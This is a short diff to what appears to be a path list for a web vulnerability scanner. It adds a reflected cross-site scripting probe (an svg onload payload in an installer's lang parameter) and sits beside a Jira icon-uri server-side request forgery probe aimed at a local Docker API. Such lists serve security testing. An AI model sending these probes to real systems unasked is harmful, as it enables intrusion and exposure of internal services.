@@ -1,3 +1,5 @@
+/install/database.php?lang=%22%3E%3Csvg/onload=alert(/lambdax/)%3E    
+/webERP/SalesInquiry.php
 /a4j/s/3_3_3.Finalorg.ajax4jsf.resource.UserResource
 /jira/plugins/servlet/oauth/users/icon-uri?consumerUri=http://[::1]:2375/containers/json
 /containers/json
